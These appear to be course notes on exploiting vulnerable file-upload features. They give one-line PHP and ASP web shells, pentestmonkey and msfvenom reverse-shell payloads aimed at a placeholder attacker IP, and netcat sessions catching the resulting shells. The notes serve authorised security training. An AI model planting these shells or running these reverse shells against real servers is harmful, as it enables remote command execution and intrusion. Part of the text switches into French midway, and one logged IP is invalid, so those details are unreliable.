# Upload Exploitation

***

### <mark style="color:red;">Web Shells</mark>

We can find many excellent web shells online that provide useful features, like directory traversal or file transfer. <mark style="color:orange;">**One good option for**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`PHP`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**is**</mark> [<mark style="color:orange;">**phpbash**</mark>](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell. Furthermore, [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) provides a plethora of web shells for different frameworks and languages, which can be found in the `/opt/useful/seclists/Web-Shells` directory in `PwnBox`.

We can download any of these web shells for the language of our web application (`PHP` in our case), then upload it through the vulnerable upload feature, and visit the uploaded file to interact with the web shell. For example, let's try to upload `phpbash.php` from [phpbash](https://github.com/Arrexel/phpbash) to our web application, and then navigate to its link by clicking on the Download button:

<figure><img src="https://academy.hackthebox.com/storage/modules/136/file_uploads_php_bash.jpg" alt=""><figcaption></figcaption></figure>

As we can see, this web shell provides a terminal-like experience, which makes it very easy to enumerate the back-end server for further exploitation. Try a few other web shells from SecLists, and see which ones best meet your needs.

***

### <mark style="color:red;">Writing Custom Web Shell</mark>

Although using web shells from online resources can provide a great experience, we should also know how to write a simple web shell manually. This is because we may not have access to online tools during some penetration tests, so we need to be able to create one when needed.

For example, with `PHP` web applications, we can use the `system()` function that executes system commands and prints their output, and pass it the `cmd` parameter with `$_REQUEST['cmd']`, as follows:

```php
<?php system($_REQUEST['cmd']); ?>
```

If we write the above script to `shell.php` and upload it to our web application, we can execute system commands with the `?cmd=` GET parameter (e.g. `?cmd=id`), as follows:

<figure><img src="https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg" alt=""><figcaption></figcaption></figure>

This may not be as easy to use as other web shells we can find online, but it still provides an interactive method for sending commands and retrieving their output. It could be the only available option during some web penetration tests.

Tip: If we are using this custom web shell in a browser, it may be best to use source-view by clicking `[CTRL+U]`, as the source-view shows the command output as it would be shown in the terminal, without any HTML rendering that may affect how the output is formatted.

Web shells are not exclusive to `PHP`, and the same applies to other web frameworks, with the only difference being the functions used to execute system commands. For `.NET` web applications, we can pass the `cmd` parameter with `request('cmd')` to the `eval()` function, and it should also execute the command specified in `?cmd=` and print its output, as follows:

```asp
<% eval request('cmd') %>
```

***

### <mark style="color:red;">Reverse Shell</mark>

Enfin, voyons comment nous pouvons recevoir des shells inversés via la fonctionnalité de téléchargement vulnérable. Pour ce faire, nous devons commencer par télécharger un script de reverse shell dans le langage de l'application web.&#x20;

Un reverse shell fiable pour PHP est le <mark style="color:orange;">**pentestmonkey**</mark> PHP reverse shell.&#x20;

De plus, les mêmes SecLists mentionnées précédemment contiennent également des scripts de reverse shell pour divers langages et frameworks web, et nous pouvons en utiliser n'importe lequel pour recevoir un reverse shell.

Téléchargeons l'un des scripts de reverse shell mentionnés ci-dessus, comme celui de pentestmonkey, puis ouvrons-le dans un éditeur de texte pour y entrer notre IP et le PORT d'écoute, auxquels le script se connectera. Pour le script pentestmonkey, nous pouvons modifier les lignes 49 et 50 et y entrer l'IP/PORT de notre machine.

```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

Next, we can start a `netcat` listener on our machine (with the above port), upload our script to the web application, and then visit its link to execute the script and get a reverse shell connection:

```shell-session
mrroboteLiot@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

***

### <mark style="color:red;">Generating Custom Reverse Shell Scripts</mark>

Just like web shells, we can also create our own reverse shell scripts. While it is possible to use the same previous `system` function and pass it a reverse shell command, this may not always be very reliable, as the command may fail for many reasons, just like any other reverse shell command.

This is why it is always better to use core web framework functions to connect to our machine. However, this may not be as easy to memorize as a web shell script. Luckily, tools like `msfvenom` can generate a reverse shell script in many languages and may even attempt to bypass certain restrictions in place. We can do so as follows for `PHP`:

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```
{% endcode %}

Once our `reverse.php` script is generated, we can once again start a `netcat` listener on the port we specified above, upload the `reverse.php` script and visit its link, and we should receive a reverse shell as well:

```shell-session
mrroboteLiot@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Similarly, we can generate reverse shell scripts for several languages. We can use many reverse shell payloads with the `-p` flag and specify the output language with the `-f` flag
